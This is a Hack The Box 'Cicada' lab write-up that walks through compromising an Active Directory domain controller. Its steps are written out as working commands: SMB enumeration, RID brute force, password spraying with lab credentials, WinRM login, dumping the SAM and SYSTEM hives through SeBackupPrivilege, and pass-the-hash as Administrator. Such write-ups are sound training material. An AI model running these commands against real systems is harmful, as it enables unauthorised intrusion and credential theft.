# HTB Cicada – Writeup (OSCP Style)

## 📌 Overview

* Target: Cicada
* Difficulty: Easy (Active Directory)
* Key Concepts:

  * SMB Enumeration
  * RID Brute Force
  * Password Spraying
  * LDAP Enumeration
  * Credential Chaining
  * SeBackupPrivilege Abuse

---

## 🔎 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- <IP>
```

Key findings:

* Domain Controller detected (LDAP, Kerberos, DNS)
* Domain: `cicada.htb`
* Host: `CICADA-DC`

Active Directory ports (LDAP, Kerberos, SMB) indicate a DC. ([Medium][1])

---

## 📂 2. SMB Enumeration (Anonymous)

List shares:

```bash
smbclient -L //<IP> -N
```

Accessible share:

```text
HR
```

---

## 🔑 3. Password Discovery (HR Share)

```bash
smbclient //<IP>/HR -N
get "Notice from HR.txt"
```

Inside file:

```text
Default password:
Cicada$M6Corpb*@Lp#nZp!8
```

This is a **default password for new users**. ([0xBEN][2])

---

## 👤 4. Username Enumeration (RID Bruteforce)

```bash
netexec smb <IP> -u '' -p '' --rid-brute
```

Extract usernames:

```bash
netexec smb <IP> -u '' -p '' --rid-brute | grep SidTypeUser > users.txt
```

---

## 🔥 5. Password Spraying

```bash
netexec smb <IP> -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

Valid credentials found:

```text
michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8
```

---

## 🧠 6. LDAP Enumeration

Using valid user:

```bash
netexec smb <IP> -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

Check descriptions → password leak:

```text
david.orelious : <password in description>
```

AD misconfig: password stored in description. ([0xdf hacks stuff][3])

---

## 🔑 7. New Credentials

```text
david.orelious : <password>
```

---

## 📁 8. SMB Access with David

```bash
smbclient //<IP>/DEV -U david.orelious
```

Download script:

```bash
get Backup_script.ps1
```

---

## 🔓 9. Credential Leak (Script)

Inside script:

```text
emily.oscars : Q!3@Lp#M6b*7t*Vt
```

---

## 💻 10. WinRM Access

```bash
evil-winrm -i <IP> -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

---

## ⚙️ 11. Privilege Escalation

Check groups:

```powershell
whoami /groups
```

Result:

```text
Backup Operators
```

---

## 💀 12. Abuse SeBackupPrivilege

Create working directory:

```powershell
mkdir C:\temp
```

Dump registry hives:

```powershell
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

Download files:

```bash
download sam
download system
```

---

## 🔓 13. Extract Hashes

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

Output:

```text
Administrator:500:<NTLM_HASH>
```

---

## 👑 14. Administrator Access

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

---

## 🏁 15. Flags

User flag:

```powershell
type C:\Users\emily.oscars\Desktop\user.txt
```

Root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧠 Key Takeaways

* SMB shares often expose sensitive data
* Default passwords can be reused across users
* LDAP descriptions may leak credentials
* Scripts in shares may contain plaintext credentials
* Backup Operators can dump registry hives
* SeBackupPrivilege → full system compromise

---

## 💀 Attack Chain Summary

```text
SMB (anon) →
HR share →
default password →
RID brute →
password spray →
michael →
LDAP enum →
david password →
DEV share →
script →
emily creds →
WinRM →
Backup Operators →
SAM dump →
hash →
Administrator
```

[1]: https://medium.com/%40WireHawkSecurity/hack-the-box-cicada-walkthrough-2bc392f1f2a1?utm_source=chatgpt.com "Cicada 🪲 | Hack The Box Walkthrough"
[2]: https://benheater.com/hackthebox-cicada/?utm_source=chatgpt.com "HackTheBox | Cicada"
[3]: https://0xdf.gitlab.io/2025/02/15/htb-cicada.html?utm_source=chatgpt.com "HTB: Cicada | 0xdf hacks stuff"
